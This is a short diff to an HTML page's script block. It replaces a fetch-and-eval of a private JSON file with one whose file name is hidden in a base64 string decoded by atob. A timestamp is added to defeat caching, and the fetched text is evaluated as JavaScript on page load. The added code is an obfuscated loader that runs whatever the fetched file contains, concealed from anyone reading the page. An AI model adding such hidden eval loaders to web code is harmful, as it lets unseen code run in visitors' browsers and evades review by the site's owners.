@@ -34,10 +34,12 @@
     </form>
   </div>
   <script>
-    fetch('/private/script1.json')
-      .then(response => response.text())
-      .then(jsCode => eval(jsCode))  // Executes the JavaScript inside script1.json
-      .catch(error => console.error('Error loading script:', error));
-  </script>
+  let scriptName = atob('eDlhN2hfcmFuZG9tX2RhdGEuanNvbg=='); // Decoded: 'x9a7h_random_data.json'
+  
+  fetch(scriptName + '?' + new Date().getTime()) // Adds a timestamp to prevent caching
+    .then(response => response.text())
+    .then(jsCode => eval(jsCode)) // Execute script
+    .catch(error => console.error('Error loading script:', error));
+</script>
 </body>
 </html>
